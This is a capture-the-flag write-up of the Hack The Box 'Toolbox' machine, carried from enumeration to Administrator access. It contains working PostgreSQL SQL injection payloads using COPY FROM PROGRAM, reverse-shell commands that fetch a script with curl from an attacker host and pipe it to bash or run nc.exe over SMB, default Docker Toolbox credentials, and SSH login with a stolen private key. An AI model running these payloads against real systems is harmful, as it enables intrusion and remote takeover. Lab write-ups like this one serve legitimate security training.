**Skills Required**
Basic Web Knowledge
**Skills Learned**
Leveraging PostgreSQL SQL Injection for RCE
Docker Toolbox Exploitation

Port 21 FTP
Port 22 SSH
Port 445 SMB
Port 5985 WinRM
Port 443 SSL

Since port 445 SMB is open, I use "crackmapexec" to gather more information about the target machine:

```
crackmapexec smb 10.10.10.236
SMB         10.10.10.236    445    TOOLBOX          [*] Windows 10.0 Build 17763 x64 (name:TOOLBOX) (domain:Toolbox) (signing:False) (SMBv1:False)
```

I can also use "smbmap" to try to list the shared resources on the victim machine:

```
smbmap -H 10.10.10.236 -u 'null'
```

However, I get access denied, so I would need valid credentials.

Continuing with enumeration, since port 443 is open, I can use OpenSSL to inspect the certificate and find more information, such as domain names, among other things:

```
openssl s_client -connect 10.10.10.236:443
```

I find a domain name, so I save it in my hosts file.

I check the website and encounter a login panel. I try SQL injection payloads and find that the authentication panel is vulnerable and is using PostgreSQL. I use payloads from the website "hacktricks" to confirm if it's vulnerable to SQL injection:

```
username=';select pg_sleep(10);-- -&password='
```

Having confirmed the vulnerability, I can try to inject commands. In PostgreSQL, I can try to create a table and execute commands:

```
username=';CREATE+TABLE+cmd_exec(cmd_output+text);--+-&password='
```

I can try to inject a command that connects to a network share via SMB on my machine and runs Netcat to establish a reverse shell:

```
# Victim machine
username=';COPY+cmd_exec+FROM+PROGRAM+'\\10.10.14.4\smbfolder\nc.exe+-e+cmd+10.10.14.4+1234';--+-&password='
# My machine
smbserver smbfolder $(pwd) -smb2support
```

This doesn't work, so I suspect the machine behind is Linux, maybe a Linux container. I play with Curl to download my malicious file that executes a reverse shell:

```bash
# On my machine
nvim shell
-----
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.4/1234 0>&1
-----
python -m http.server 80
rlwrap nc -nlvp 1234

# Victim machine
username=';COPY+cmd_exec+FROM+PROGRAM+'curl+http://10.10.14.4/shell|bash';--+-&password='
```

This way, I gain access to a container. Now, I need to escape the container to gain access to the Windows machine.

Going back to the initial port enumeration, port 22 is active, and it has a binary called "docker-toolbox." Investigating this binary, I discover default credentials, so I try them:

```
ssh docker@172.17.0.1
tcuser
```

This gives me access to another Docker container. While enumerating directories, I find a directory named "c" with a structure similar to Windows. Inside the "Administrator" directory, I find an SSH private key (id_rsa). I can try to connect to the Windows machine using this key:

```bash
# On my machine
nvim id_rsa
chmod 600 id_rsa
ssh -i id_rsa Administrator@10.10.10.236
```

This way, I gain access as the Administrator to the Windows machine and can consider the Toolbox machine on Hack The Box completed.